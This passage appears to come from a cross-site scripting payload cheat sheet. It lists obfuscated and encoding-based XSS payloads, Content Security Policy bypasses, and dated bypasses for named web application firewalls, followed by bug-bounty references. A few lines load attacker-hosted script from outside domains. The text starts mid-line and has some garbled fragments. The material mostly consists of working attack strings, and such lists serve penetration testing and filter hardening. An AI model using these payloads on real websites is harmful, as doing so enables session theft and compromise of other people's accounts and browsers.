ᨆ=\u0026#39;\u0026#39;,ᨊ=!ᨆ+ᨆ,ᨎ=!ᨊ+ᨆ,ᨂ=ᨆ+{},ᨇ=ᨊ[ᨆ++],ᨋ=ᨊ[ᨏ=ᨆ],ᨃ=++ᨏ+ᨆ,ᨅ=ᨂ[ᨏ+ᨃ],ᨊ[ᨅ+=ᨂ[ᨆ]+(ᨊ.ᨎ+ᨂ)[ᨆ]+ᨎ[ᨃ]+ᨇ+ᨋ+ᨊ[ᨏ]+ᨅ+ᨇ+ᨂ[ᨆ]+ᨋ][ᨅ](ᨎ[ᨆ]+ᨎ[ᨏ]+ᨊ[ᨃ]+ᨋ+ᨇ+\u0026#34;(ᨆ)\u0026#34;)() More alphabets on http://aem1k.com/aurebesh.js/#\nBypass using ECMAScript6 # \u0026lt;script\u0026gt;alert\u0026amp;DiacriticalGrave;1\u0026amp;DiacriticalGrave;\u0026lt;/script\u0026gt; Bypass using Octal encoding # javascript:\u0026#39;\\74\\163\\166\\147\\40\\157\\156\\154\\157\\141\\144\\75\\141\\154\\145\\162\\164\\50\\61\\51\\76\u0026#39; Bypass using Unicode # Unicode character U+FF1C FULLWIDTH LESS­THAN SIGN (encoded as %EF%BC%9C) was transformed into U+003C LESS­THAN SIGN (\u0026lt;) Unicode character U+02BA MODIFIER LETTER DOUBLE PRIME (encoded as %CA%BA) was transformed into U+0022 QUOTATION MARK (\u0026#34;) Unicode character U+02B9 MODIFIER LETTER PRIME (encoded as %CA%B9) was transformed into U+0027 APOSTROPHE (\u0026#39;) E.g : http://www.example.net/something%CA%BA%EF%BC%9E%EF%BC%9Csvg%20onload=alert%28/XSS/%29%EF%BC%9E/ %EF%BC%9E becomes \u0026gt; %EF%BC%9C becomes \u0026lt; Bypass using Unicode converted to uppercase\nİ (%c4%b0).toLowerCase() =\u0026gt; i ı (%c4%b1).toUpperCase() =\u0026gt; I ſ (%c5%bf) .toUpperCase() =\u0026gt; S K (%E2%84%AA).toLowerCase() =\u0026gt; k \u0026lt;ſvg onload=... \u0026gt; become \u0026lt;SVG ONLOAD=...\u0026gt; \u0026lt;ıframe id=x onload=\u0026gt;.toUpperCase() become \u0026lt;IFRAME ID=X ONLOAD=\u0026gt; Bypass using UTF-7 # +ADw-img src=+ACI-1+ACI- onerror=+ACI-alert(1)+ACI- /+AD4- Bypass using UTF-8 # \u0026lt; = %C0%BC = %E0%80%BC = %F0%80%80%BC \u0026gt; = %C0%BE = %E0%80%BE = %F0%80%80%BE \u0026#39; = %C0%A7 = %E0%80%A7 = %F0%80%80%A7 \u0026#34; = %C0%A2 = %E0%80%A2 = %F0%80%80%A2 \u0026#34; = %CA%BA \u0026#39; = %CA%B9 Bypass using UTF-16be # %00%3C%00s%00v%00g%00/%00o%00n%00l%00o%00a%00d%00=%00a%00l%00e%00r%00t%00(%00)%00%3E%00 \\x00\u0026lt;\\x00s\\x00v\\x00g\\x00/\\x00o\\x00n\\x00l\\x00o\\x00a\\x00d\\x00=\\x00a\\x00l\\x00e\\x00r\\x00t\\x00(\\x00)\\x00\u0026gt; Bypass using UTF-32 # %00%00%00%00%00%3C%00%00%00s%00%00%00v%00%00%00g%00%00%00/%00%00%00o%00%00%00n%00%00%00l%00%00%00o%00%00%00a%00%00%00d%00%00%00=%00%00%00a%00%00%00l%00%00%00e%00%00%00r%00%00%00t%00%00%00(%00%00%00)%00%00%00%3E Bypass using BOM # Byte Order Mark (The page must begin with the BOM character.) BOM character allows you to override charset of the page\nBOM Character for UTF-16 Encoding: Big Endian : 0xFE 0xFF Little Endian : 0xFF 0xFE XSS : %fe%ff%00%3C%00s%00v%00g%00/%00o%00n%00l%00o%00a%00d%00=%00a%00l%00e%00r%00t%00(%00)%00%3E BOM Character for UTF-32 Encoding: Big Endian : 0x00 0x00 0xFE 0xFF Little Endian : 0xFF 0xFE 0x00 0x00 XSS : %00%00%fe%ff%00%00%00%3C%00%00%00s%00%00%00v%00%00%00g%00%00%00/%00%00%00o%00%00%00n%00%00%00l%00%00%00o%00%00%00a%00%00%00d%00%00%00=%00%00%00a%00%00%00l%00%00%00e%00%00%00r%00%00%00t%00%00%00(%00%00%00)%00%00%00%3E Bypass using weird encoding or native interpretation # \u0026lt;script\u0026gt;\\u0061\\u006C\\u0065\\u0072\\u0074(1)\u0026lt;/script\u0026gt; \u0026lt;img src=\u0026#34;1\u0026#34; onerror=\u0026#34;\u0026amp;#x61;\u0026amp;#x6c;\u0026amp;#x65;\u0026amp;#x72;\u0026amp;#x74;\u0026amp;#x28;\u0026amp;#x31;\u0026amp;#x29;\u0026#34; /\u0026gt; \u0026lt;iframe src=\u0026#34;javascript:%61%6c%65%72%74%28%31%29\u0026#34;\u0026gt;\u0026lt;/iframe\u0026gt; \u0026lt;script\u0026gt;$=~[];$={___:++$,$$$$:(![]+\u0026#34;\u0026#34;)[$],__$:++$,$_$_:(![]+\u0026#34;\u0026#34;)[$],_$_:++$,$_$$:({}+\u0026#34;\u0026#34;)[$],$$_$:($[$]+\u0026#34;\u0026#34;)[$],_$$:++$,$$$_:(!\u0026#34;\u0026#34;+\u0026#34;\u0026#34;)[$],$__:++$,$_$:++$,$$__:({}+\u0026#34;\u0026#34;)[$],$$_:++$,$$$:++$,$___:++$,$__$:++$};$.$_=($.$_=$+\u0026#34;\u0026#34;)[$.$_$]+($._$=$.$_[$.__$])+($.$$=($.$+\u0026#34;\u0026#34;)[$.__$])+((!$)+\u0026#34;\u0026#34;)[$._$$]+($.__=$.$_[$.$$_])+($.$=(!\u0026#34;\u0026#34;+\u0026#34;\u0026#34;)[$.__$])+($._=(!\u0026#34;\u0026#34;+\u0026#34;\u0026#34;)[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$$=$.$+(!\u0026#34;\u0026#34;+\u0026#34;\u0026#34;)[$._$$]+$.__+$._+$.$+$.$$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$$+\u0026#34;\\\u0026#34;\u0026#34;+$.$_$_+(![]+\u0026#34;\u0026#34;)[$._$_]+$.$$$_+\u0026#34;\\\\\u0026#34;+$.__$+$.$$_+$._$_+$.__+\u0026#34;(\u0026#34;+$.___+\u0026#34;)\u0026#34;+\u0026#34;\\\u0026#34;\u0026#34;)())();\u0026lt;/script\u0026gt; \u0026lt;script\u0026gtu0026lt;/script\u0026gt; Bypass using jsfuck # Bypass using jsfuck\nypass # Check the CSP on https://csp-evaluator.withgoogle.com and the post : How to use Google’s CSP Evaluator to bypass CSP\nBypass CSP using JSONP from Google (Trick by @apfeifer27) # //google.com/complete/search?client=chrome\u0026amp;jsonp=alert(1);\n\u0026lt;script/src=//google.com/complete/search?client=chrome%26jsonp=alert(1);\u0026gt;\u0026#34; More JSONP endpoints:\n/Intruders/jsonp_endpoint.txt JSONBee/jsonp.txt Bypass CSP by lab.wallarm.com # Works for CSP like Content-Security-Policy: default-src 'self' 'unsafe-inline';, POC here\nscript=document.createElement(\u0026#39;script\u0026#39;); script.src=\u0026#39;//bo0om.ru/csp.js\u0026#39;; window.frames[0].document.head.appendChild(script); Bypass CSP by Rhynorater # // CSP Bypass with Inline and Eval d=document;f=d.createElement(\u0026#34;iframe\u0026#34;);f.src=d.querySelector(\u0026#39;link[href*=\u0026#34;.css\u0026#34;]\u0026#39;).href;d.body.append(f);s=d.createElement(\u0026#34;script\u0026#34;);s.src=\u0026#34;https://[YOUR_XSSHUNTER_USERNAME].xss.ht\u0026#34;;setTimeout(function(){f.contentWindow.document.head.append(s);},1000) Bypass CSP by @akita_zen # Works for CSP like script-src self\n\u0026lt;object data=\u0026#34;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\u0026#34;\u0026gt;\u0026lt;/object\u0026gt; Bypass CSP by @404death # Works for CSP like script-src 'self' data: as warned about in the official mozilla documentation.\n\u0026lt;script src=\u0026#34;data:,alert(1)\u0026#34;\u0026gt;/\u0026lt;/script\u0026gt; Common WAF Bypass # Cloudflare XSS Bypasses by @Bohdan Korzhynskyi # 25st January 2021 # \u0026lt;svg/onrandom=random onload=confirm(1)\u0026gt; \u0026lt;video onnull=null onmouseover=confirm(1)\u0026gt; 21st April 2020 # \u0026lt;svg/OnLoad=\u0026#34;`${prompt``}`\u0026#34;\u0026gt; 22nd August 2019 # \u0026lt;svg/onload=%26nbsp;alert`bohdan`+ 5th June 2019 # 1\u0026#39;\u0026#34;\u0026gt;\u0026lt;img/src/onerror=.1|alert``\u0026gt; 3rd June 2019 # \u0026lt;svg onload=prompt%26%230000000040document.domain)\u0026gt; \u0026lt;svg onload=prompt%26%23x000000028;document.domain)\u0026gt; xss\u0026#39;\u0026#34;\u0026gt;\u0026lt;iframe srcdoc=\u0026#39;%26lt;script\u0026gt;;prompt`${document.domain}`%26lt;/script\u0026gt;\u0026#39;\u0026gt; Cloudflare XSS Bypass - 22nd March 2019 (by @RakeshMane10) # \u0026lt;svg/onload=\u0026amp;#97\u0026amp;#108\u0026amp;#101\u0026amp;#114\u0026amp;#00116\u0026amp;#40\u0026amp;#41\u0026amp;#x2f\u0026amp;#x2f Cloudflare XSS Bypass - 27th February 2018 # \u0026lt;a href=\u0026#34;j\u0026amp;Tab;a\u0026amp;Tab;v\u0026amp;Tab;asc\u0026amp;NewLine;ri\u0026amp;Tab;pt\u0026amp;colon;\u0026amp;lpar;a\u0026amp;Tab;l\u0026amp;Tab;e\u0026amp;Tab;r\u0026amp;Tab;t\u0026amp;Tab;(document.domain)\u0026amp;rpar;\u0026#34;\u0026gt;X\u0026lt;/a\u0026gt; Chrome Auditor - 9th August 2018 # \u0026lt;/script\u0026gt;\u0026lt;svg\u0026gt;\u0026lt;script\u0026gt;alert(1)-%26apos%3B Live example by @brutelogic - https://brutelogic.com.br/xss.php\nIncapsula WAF Bypass by @Alra3ees- 8th March 2018 # anythinglr00\u0026lt;/script\u0026gt;\u0026lt;script\u0026gt;alert(document.domain)\u0026lt;/script\u0026gt;uxldz anythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxldz Incapsula WAF Bypass by @c0d3G33k - 11th September 2018 # \u0026lt;object data=\u0026#39;data:text/html;;;;;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\u0026#39;\u0026gt;\u0026lt;/object\u0026gt; Incapsula WAF Bypass by @daveysec - 11th May 2019 # \u0026lt;svg onload\\r\\n=$.globalEval(\u0026#34;al\u0026#34;+\u0026#34;ert()\u0026#34;);\u0026gt; Akamai WAF Bypass by @zseano - 18th June 2018 # ?\u0026#34;\u0026gt;\u0026lt;/script\u0026gt;\u0026lt;base%20c%3D=href%3Dhttps:\\mysite\u0026gt; Akamai WAF Bypass by @s0md3v - 28th October 2018 # \u0026lt;dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() x\u0026gt; WordFence WAF Bypass by @brutelogic - 12th September 2018 # \u0026lt;a href=javas\u0026amp;#99;ript:alert(1)\u0026gt; Fortiweb WAF Bypass by @rezaduty - 9th July 2019 # \\u003e\\u003c\\u0068\\u0031 onclick=alert(\u0026#39;1\u0026#39;)\\u003e References # Unleashing-an-Ultimate-XSS-Polyglot tbm (Relative Path Overwrite) RPO XSS - Infinite Security RPO TheSpanner RPO Gadget - innerthmtl Relative Path Overwrite - Detectify XSS ghettoBypass - d3adend XSS without HTML: Client-Side Template Injection with AngularJS XSSING WEB PART - 2 - Rakesh Mane Making an XSS triggered by CSP bypass on Twitter. @tbmnull Ways to alert(document.domain) - @tomnomnom D1T1 - Michele Spagnuolo and Lukas Wilschelbaum - So We Broke All CSPs Sleeping stored Google XSS Awakens a $5000 Bounty by Patrik Fehrenbach RPO that lead to information leakage in Google by filedescriptor God-like XSS, Log-in, Log-out, Log-in in Uber by Jack Whitton Three Stored XSS in Facebook by Nirgoldshlager Using a Braun Shaver to Bypass XSS Audit and WAF by Frans Rosen An XSS on Facebook via PNGs \u0026amp; Wonky Content Types by Jack Whitton Stored XSS in *.ebay.com by Jack Whitton Complicated, Best Report of Google XSS by Ramzes Tricky Html Injection and Possible XSS in sms-be-vip.twitter.com by secgeek Command Injection in Google Console by Venkat S Facebook\u0026rsquo;s Moves - OAuth XSS by PAULOS YIBELO Stored XSS in Google Docs (Bug Bounty) by Harry M Gertos Stored XSS on developer.uber.com via admin account compromise in Uber by James Kettle (albinowax) Yahoo Mail stored XSS by Klikki Oy Abusing XSS Filter: One ^ leads to XSS(CVE-2016-3212) by Masato Kinugawa Youtube XSS by fransrosen Best Google XSS again - by Krzysztof Kotowicz IE \u0026amp; Edge URL parsing Problem - by detectify Google XSS subdomain Clickjacking Microsoft XSS and Twitter XSS Google Japan Book XSS Flash XSS mega nz - by frans Flash XSS in multiple libraries - by Olivier Beg xss in google IE, Host Header Reflection Years ago Google xss xss in google by IE weird behavior xss in Yahoo Fantasy Sport xss in Yahoo Mail Again, worth $10000 by Klikki Oy Sleeping XSS in Google by securityguard Decoding a .htpasswd to earn a payload of money by securityguard Google Account Takeover AirBnb Bug Bounty: Turning Self-XSS into Good-XSS #2 by geekboy Uber Self XSS to Global XSS How I found a $5,000 Google Maps XSS (by fiddling with Protobuf) by Marin MoulinierFollow Airbnb – When Bypassing JSON Encoding, XSS Filter, WAF, CSP, and Auditor turns into Eight Vulnerabilities by Brett XSSI, Client Side Brute Force postMessage XSS on a million sites - December 15, 2016 - Mathias Karlsson postMessage XSS Bypass XSS in Uber via Cookie by zhchbin Stealing contact form data on www.hackerone.com using Marketo Forms XSS with postMessage frame-jumping and jQuery-JSONP by frans XSS due to improper regex in third party js Uber 7k XSS XSS in TinyMCE 2.4.0 by Jelmer de Hen Pass uncoded URL in IE11 to cause XSS Twitter XSS by stopping redirection and javascript scheme by Sergey Bobrov Auth DOM Uber XSS Managed Apps and Music: two Google reflected XSSes App Maker and Colaboratory: two Google stored XSSes XSS in www.yahoo.com Stored XSS, and SSRF in Google using the Dataset Publishing Language Stored XSS on Snapchat XSS cheat sheet - PortSwigger mXSS Attacks: Attacking well-secured Web-Applications by using innerHTML Mutations - Mario Heiderich, Jörg Schwenk, Tilman Frosch, Jonas Magazinius, Edward Z. Yang Self Closing Script Bypass \u0026lt; with ＜ Bypassing Signature-Based XSS Filters: Modifying Script Code "}]